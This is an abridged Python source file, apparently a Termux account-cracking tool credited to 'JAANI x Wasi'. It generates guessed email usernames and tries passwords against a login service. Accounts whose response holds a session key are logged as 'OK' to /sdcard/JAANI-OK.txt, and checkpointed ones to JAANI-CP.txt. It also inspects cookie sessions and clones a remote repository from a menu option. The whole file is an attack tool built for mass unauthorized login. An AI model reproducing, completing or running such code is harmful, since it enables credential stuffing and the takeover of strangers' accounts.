...
\033[1;97m Owner  : JAANI x Wasi :/

\033[1;97m GitHub : JAANI-404 :/
...
def Hxw_Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/JAANI-404/FILE')
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            ...
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=JAANI-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            ...
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=JAANI-2233]'))
...
def gmail():     
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.JAANI','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            ...
            fo = open('.JAANI', 'r').read().splitlines()
...
def method():
    ...
    print(f"{oo('•')}/sdcard/JAANI-OK.txt")
     ...
     try:
      ...
      #      print(response.text)
            ...
            if 'session_key' in response.text:
                ...
                print('\r\033[1;92m[\033[1;97mJAANI-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')

                open('/sdcard/JAANI-OK.txt','a').write(f'{acc} • {pword}\n')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mJAANI-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')

                cpacc.append(acc)

                open('/sdcard/JAANI-CP.txt','a').write(f'{acc} • {pword}\n')
